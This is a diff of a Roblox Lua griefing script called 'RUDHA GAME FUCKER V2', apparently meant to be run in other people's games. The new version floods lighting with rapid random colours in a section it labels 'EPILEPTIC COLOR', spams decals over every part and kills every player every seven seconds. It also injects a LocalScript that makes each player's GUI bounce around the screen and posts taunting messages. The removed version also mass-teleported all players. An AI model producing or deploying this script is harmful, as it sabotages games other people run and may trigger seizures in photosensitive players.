@@ -1,194 +1,236 @@
---rudha game fucker
+--RUDHA GAME FUCKER V2
+
+
+
+
+
+
+-------------------------
+
+
+-- CONFIGURAÇÃO
+-------------------------
+
+local CONFIG = {
+	ASSET_ID = "96931292236031", -- <<< MUDA AQUI
+	MUSIC_ID = "125324801699414", -- <<< MUDA AQUI
+	DISCO_SPEED = 0.2,
+	COLOR_SPEED = 0.1,
+	GUI_SPEED_MIN = 100,
+	GUI_SPEED_MAX = 300,
+	BASEPLATE_TILT = 20
+}
+
+-------------------------
+-- SERVICES
+-------------------------
+
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local StarterGui = game:GetService("StarterGui")
 local SoundService = game:GetService("SoundService")
 local RunService = game:GetService("RunService")
-local Workspace = game:GetService("Workspace")
 
-local plr = Players.LocalPlayer
+local ASSET = "rbxassetid://" .. CONFIG.ASSET_ID
+local MUSIC = "rbxassetid://" .. CONFIG.MUSIC_ID
 
-local IMAGE_ID = "rbxassetid://117467695924241"
-local AUDIO_ID = "rbxassetid://139474101611994"
+-------------------------
+-- SKY
+-------------------------
 
-pcall(function()
-	Lighting:ClearAllChildren()
-	local sky = Instance.new("Sky", Lighting)
-	sky.SkyboxBk = IMAGE_ID
-	sky.SkyboxDn = IMAGE_ID
-	sky.SkyboxFt = IMAGE_ID
-	sky.SkyboxLf = IMAGE_ID
-	sky.SkyboxRt = IMAGE_ID
-	sky.SkyboxUp = IMAGE_ID
-end)
+local sky = Instance.new("Sky", Lighting)
+sky.SkyboxBk = ASSET
+sky.SkyboxDn = ASSET
+sky.SkyboxFt = ASSET
+sky.SkyboxLf = ASSET
+sky.SkyboxRt = ASSET
+sky.SkyboxUp = ASSET
 
-pcall(function()
-	local sound = Instance.new("Sound", SoundService)
-	sound.SoundId = AUDIO_ID
-	sound.Volume = 10
-	sound.PlaybackSpeed = 1.20
-	sound.Looped = true
-	sound:Play()
-end)
+-------------------------
+-- DISCO FOG
+-------------------------
+
+Lighting.FogStart = 0
+Lighting.FogEnd = 100
 
 task.spawn(function()
 	while true do
-		pcall(function()
-			StarterGui:SetCore("SendNotification", {
-				Title = "RUDHA",
-				Text = "Ŗ̸̤͋ǘ̴̮̣̫̯͂͝ḑ̸͔̈́ḧ̶͖̩́͒a̸̗̰̽̈́́͜ ̸̞̣̬̑ẅ̶̪̩̿̾à̶̝͖̬͍̅s̶̭͈͆͋̉ͅ ̶̱̝̺́̐h̸̠͉͗́͜e̴͎͎͊̏̓r̷͚̀̄e̷̦͗́͊̈́!̴͎̮̺̗̑",
-				Duration = 2,
-				Icon = IMAGE_ID
-			})
-		end)
-		task.wait(2)
+		Lighting.Brightness = math.random(0, 10)
+		Lighting.Ambient = Color3.fromRGB(math.random(255), math.random(255), math.random(255))
+		Lighting.FogColor = Color3.fromRGB(math.random(255), math.random(255), math.random(255))
+		task.wait(CONFIG.DISCO_SPEED)
 	end
 end)
 
+-------------------------
+-- EPILEPTIC COLOR
+-------------------------
+
 task.spawn(function()
 	while true do
-		for _, obj in ipairs(Workspace:GetDescendants()) do
-			if obj:IsA("BasePart") then
-				local model = obj:FindFirstAncestorOfClass("Model")
-				if not (model and model:FindFirstChildOfClass("Humanoid")) then
-					for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
-						local name = "RudhaDecal_" .. face.Name
-						if not obj:FindFirstChild(name) then
-							local decal = Instance.new("Decal")
-							decal.Name = name
-							decal.Texture = IMAGE_ID
-							decal.Face = face
-							decal.Transparency = 0
-							decal.Parent = obj
-						end
-					end
+		Lighting.Ambient = Color3.fromRGB(math.random(255), math.random(255), math.random(255))
+		Lighting.OutdoorAmbient = Color3.fromRGB(math.random(255), math.random(255), math.random(255))
+		Lighting.ColorShift_Top = Color3.fromRGB(math.random(255), math.random(255), math.random(255))
+		Lighting.ColorShift_Bottom = Color3.fromRGB(math.random(255), math.random(255), math.random(255))
+		task.wait(CONFIG.COLOR_SPEED)
+	end
+end)
+
+-------------------------
+-- BASEPLATE /
+-------------------------
+
+local baseplate = workspace:FindFirstChild("Baseplate")
+
+if baseplate and baseplate:IsA("BasePart") then
+	baseplate.CFrame *= CFrame.Angles(0, 0, math.rad(CONFIG.BASEPLATE_TILT))
+end
+
+-------------------------
+-- DECAL SPAM
+-------------------------
+
+local function isPlayerCharacter(part)
+	local model = part:FindFirstAncestorOfClass("Model")
+	if model and model:FindFirstChildOfClass("Humanoid") then
+		return true
+	end
+	return false
+end
+
+for _, obj in pairs(workspace:GetDescendants()) do
+	if obj:IsA("BasePart")
+		and not obj:FindFirstChild("CHAOS_DECAL")
+		and not isPlayerCharacter(obj) then
+
+		for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+			local decal = Instance.new("Decal")
+			decal.Name = "CHAOS_DECAL"
+			decal.Texture = ASSET
+			decal.Face = face
+			decal.Parent = obj
+		end
+	end
+end
+
+-------------------------
+-- PARTÍCULAS NOS PLAYERS
+-------------------------
+
+local function addParticles(character)
+	local root = character:WaitForChild("HumanoidRootPart", 5)
+	if root then
+		local att = Instance.new("Attachment", root)
+		local particle = Instance.new("ParticleEmitter", att)
+		particle.Texture = ASSET
+		particle.Rate = 25
+		particle.Lifetime = NumberRange.new(2)
+		particle.Speed = NumberRange.new(1, 2)
+		particle.Size = NumberSequence.new(2)
+		particle.SpreadAngle = Vector2.new(360, 360)
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(addParticles)
+end)
+
+-------------------------
+-- MESSAGE
+-------------------------
+
+local message = Instance.new("Message", workspace)
+message.Text = "THE TEAPOTS HAVE TAKEN OVER."
+task.wait(5)
+
+message.Text = "RUDHA IS SINGLE, NOT A TEAM."
+task.wait(5)
+
+message:Destroy()
+
+-------------------------
+-- MÚSICA
+-------------------------
+
+local music = Instance.new("Sound", SoundService)
+music.SoundId = MUSIC
+music.Looped = true
+music.Volume = 5
+music.Pitch = 0.8
+music:Play()
+
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Wait()
+
+	local localScript = Instance.new("LocalScript")
+
+	localScript.Source = [[
+		local RunService = game:GetService("RunService")
+		local player = game.Players.LocalPlayer
+
+		local function infect(guiObject)
+			if not guiObject:IsA("GuiObject") then return end
+
+			guiObject.Active = true
+			guiObject.AnchorPoint = Vector2.new(0, 0)
+
+			local speed = Vector2.new(
+				math.random(]] .. CONFIG.GUI_SPEED_MIN .. [[, ]] .. CONFIG.GUI_SPEED_MAX .. [[),
+				math.random(]] .. CONFIG.GUI_SPEED_MIN .. [[, ]] .. CONFIG.GUI_SPEED_MAX .. [[)
+			)
+
+			RunService.RenderStepped:Connect(function(dt)
+				if not guiObject.Parent then return end
+
+				local parentSize = guiObject.Parent.AbsoluteSize
+				local size = guiObject.AbsoluteSize
+				local pos = guiObject.AbsolutePosition
+
+				if pos.X <= 0 or pos.X + size.X >= parentSize.X then
+					speed = Vector2.new(-speed.X, speed.Y)
 				end
-			end
-		end
-		task.wait(0.6)
-	end
-end)
 
-task.spawn(function()
-	while true do
-		for _, p in ipairs(Players:GetPlayers()) do
-			if p.Character then
-				for _, part in ipairs(p.Character:GetChildren()) do
-					if part:IsA("BasePart") and not part:FindFirstChild("RudhaFire") then
-						local fire = Instance.new("Fire")
-						fire.Name = "RudhaFire"
-						fire.Size = 8
-						fire.Heat = 8
-						fire.Parent = part
-					end
+				if pos.Y <= 0 or pos.Y + size.Y >= parentSize.Y then
+					speed = Vector2.new(speed.X, -speed.Y)
 				end
-			end
-		end
-		task.wait(1)
-	end
-end)
 
-pcall(function()
-	local hint = Instance.new("Hint")
-	hint.Text = "Ŗ̸̤͋ǘ̴̮̣̫̯͂͝ḑ̸͔̈́ḧ̶͖̩́͒a̸̗̰̽̈́́͜ ̸̞̣̬̑ẅ̶̪̩̿̾à̶̝͖̬͍̅s̶̭͈͆͋̉ͅ ̶̱̝̺́̐h̸̠͉͗́͜e̴͎͎͊̏̓r̷͚̀̄e̷̦͗́͊̈́!̴͎̮̺̗̑"
-	hint.Parent = Workspace
-	task.spawn(function()
-		while true do
-			hint.Text = "Ŗ̸̤͋ǘ̴̮̣̫̯͂͝ḑ̸͔̈́ḧ̶͖̩́͒a̸̗̰̽̈́́͜ ̸̞̣̬̑ẅ̶̪̩̿̾à̶̝͖̬͍̅s̶̭͈͆͋̉ͅ ̶̱̝̺́̐h̸̠͉͗́͜e̴͎͎͊̏̓r̷͚̀̄e̷̦͗́͊̈́!̴͎̮̺̗̑"
-			task.wait(0.50)
-		end
-	end)
-end)
-
-local function TrocarCorDeTudo()
-	for _, obj in ipairs(game:GetDescendants()) do
-		if obj:IsA("BasePart") then
-			local model = obj:FindFirstAncestorOfClass("Model")
-			if not (model and model:FindFirstChildOfClass("Humanoid")) then
-				local cor = Color3.fromRGB(
-					math.random(0,255),
-					math.random(0,255),
-					math.random(0,255)
+				guiObject.Position = UDim2.fromOffset(
+					guiObject.Position.X.Offset + speed.X * dt,
+					guiObject.Position.Y.Offset + speed.Y * dt
 				)
-				obj.Color = cor
+			end)
+		end
 
-				for _, child in ipairs(obj:GetChildren()) do
-					if child:IsA("Fire") then
-						child.Color = cor
-						child.SecondaryColor = cor
-					end
+		for _, gui in pairs(player.PlayerGui:GetDescendants()) do
+			infect(gui)
+		end
+
+		player.PlayerGui.DescendantAdded:Connect(infect)
+	]]
+
+	localScript.Parent = player:WaitForChild("PlayerGui")
+end)
+
+task.spawn(function()
+	local hint = Instance.new("Hint", workspace)
+	hint.Text = "RUDHA IS SINGLE, NOT A TEAM."
+end)
+
+-------------------------
+-- MORTE GLOBAL A CADA 7 SEGUNDOS
+-------------------------
+
+task.spawn(function()
+	while true do
+		task.wait(7)
+
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player.Character then
+				local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+				if humanoid and humanoid.Health > 0 then
+					humanoid.Health = 0
 				end
 			end
 		end
 	end
-end
-
-task.spawn(function() 
-	while true do
-		TrocarCorDeTudo()
-		task.wait(0.10)
-	end
-end)
-
-RunService.RenderStepped:Connect(function()
-	local char = plr.Character
-	if char then
-		local hrp = char:FindFirstChild("HumanoidRootPart")
-		if hrp then
-			hrp.CFrame = hrp.CFrame + Vector3.new(0, 0.12, 0)
-		end
-	end
-end)
-
-local TeleportService = game:GetService("TeleportService")
-
-local PLACE_ID = 135509927066801
-
-local function teleportarGeral()
-	for _, player in pairs(Players:GetPlayers()) do
-		pcall(function()
-			TeleportService:Teleport(PLACE_ID, player)
-		end)
-	end
-end
-
-task.wait(55)
-teleportarGeral()
-
-task.spawn(function()
-	while true do
-		for _, p in ipairs(Players:GetPlayers()) do
-			if p.Character then
-				local hum = p.Character:FindFirstChildOfClass("Humanoid")
-				if hum then
-					hum.Health = 0
-				end
-			end
-		end
-		task.wait(6)
-	end
-end)
- 
-print("RUDHA WAS HERE!")
-print("SHOW'EN NO MECRY")
-print("roblox is securty at this level?")
-
-task.spawn(function()
-	local message = Instance.new("Message")
-	message.Parent = workspace
-	message.Text = "Rudha corrupted this place"
-	wait(4)
-	message.Text = "THIS GAME WAS CORRUPTED BY RUDHA :D"
-	wait(2)
-	message:Destroy()
-end)
-
-task.spawn(function()
-	local message = Instance.new("Message")
-	message.Parent = workspace
-	message.Text = "don't cry, your 7 years old kid"
-	wait(4)
-	message.Text = "players, por que estas amargo?"
-	wait(2)
-	message:Destroy()
 end)
